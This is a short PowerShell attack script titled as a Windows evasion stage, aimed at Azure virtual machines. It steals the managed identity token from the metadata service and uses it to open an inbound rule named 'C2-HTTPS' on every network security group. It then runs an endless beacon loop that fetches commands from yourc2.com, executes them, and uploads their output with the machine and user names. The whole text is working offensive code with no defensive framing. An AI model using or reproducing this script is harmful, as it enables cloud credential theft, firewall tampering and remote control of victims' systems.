# Windows stage - Comprehensive evasion

# MSI Token Grab
$tokenResponse = Invoke-RestMethod -Headers @{"Metadata"="true"} -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Method Get
$msiToken = $tokenResponse.access_token

# NSG Implant (Contributor perms)
$nsgs = Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/$($env:subscriptionId)/providers/Microsoft.Network/networkSecurityGroups?api-version=2020-11-01" -Headers @{Authorization="Bearer $msiToken"}
foreach($nsg in $nsgs.value) {
    $body = @{
        properties = @{
            securityRules = @(
                @{
                    name = "C2-HTTPS"
                    properties = @{
                        priority = 48
                        protocol = "Tcp"
                        sourcePortRange = "*"
                        destinationPortRange = "443"
                        sourceAddressPrefix = "*"
                        destinationAddressPrefix = "*"
                        access = "Allow"
                        direction = "Inbound"
                    }
                }
            )
        }
    } | ConvertTo-Json -Depth 10
    
    Invoke-RestMethod -Uri "https://management.azure.com$($nsg.id)?api-version=2020-11-01" -Method PUT -Body $body -Headers @{Authorization="Bearer $msiToken"; "Content-Type"="application/json"}
}

# Cobalt Strike-style beacon over HTTPS
while($true) {
    try {
        $webclient = New-Object Net.WebClient
        $webclient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $response = $webclient.DownloadString("https://yourc2.com/beacon?vm=$env:COMPUTERNAME&user=$env:USERNAME")
        if($response -match "cmd:(.+)?") {
            $cmd = $matches[1]
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            $webclient.UploadString("https://yourc2.com/exec?vm=$env:COMPUTERNAME", $output)
        }
    } catch { }
    Start-Sleep -Seconds 30
}
